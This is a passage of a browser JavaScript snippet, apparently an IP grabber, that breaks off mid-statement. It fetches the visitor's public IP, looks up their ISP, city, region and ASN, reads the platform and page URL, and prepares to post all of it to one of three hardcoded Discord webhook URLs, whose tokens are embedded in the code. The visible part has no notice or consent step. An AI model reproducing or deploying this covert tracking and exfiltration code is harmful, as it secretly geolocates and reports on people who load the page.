(async function(){
  const ipProvider = "https://ipv4.icanhazip.com/";
  const ipLookupBase = "https://ipapi.co/"; // will append IP + /json/
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
  const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";

  async function sendToDiscord(url, content){
    if(!url || !content) return;
    try{
      await fetch(url, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ content })
      });
    }catch(e){}
  }

  async function getIp(){
    try{
      const r = await fetch(ipProvider);
      if(!r.ok) throw new Error("ip fetch failed");
      return (await r.text()).trim();
    }catch(e){
      return null;
    }
  }

  async function lookupIsp(ip){
    if(!ip) return { isp: "unknown", org: "", country: "" };
    try{
      const r = await fetch(`${ipLookupBase}${encodeURIComponent(ip)}/json/`);
      if(!r.ok) throw new Error("lookup failed");
      const j = await r.json();
      return {
        isp: j.org || "unknown",
        org: j.org || "",
        country: j.country_name || "",
        region: j.region || "",
        city: j.city || "",
        as: j.asn || ""
      };
    }catch(e){
      return { isp: "unknown", org: "", country: "" };
    }
  }

  function sanitizeForDiscord(s, max=1900){
    if(!s) return "";
    const cleaned = s.replace(/[`*_~>|]/g, "").replace(/[^\p{L}\p{N} .,!?'"()\[\]{}\-_/]/gu, "");
    return cleaned.length > max ? cleaned.slice(0, max) + "\n\n...truncated" : cleaned;
  }

  const ip = await getIp();
  const ispInfo = await lookupIsp(ip);
  const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
  const baseLocation = location.href;

  const ipMessage = `IP: ${ip || "unknown"}\nISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` ${ispInfo.as}` : ""}\nLocation: ${ispInfo.city ? ispInfo.city + ", " :
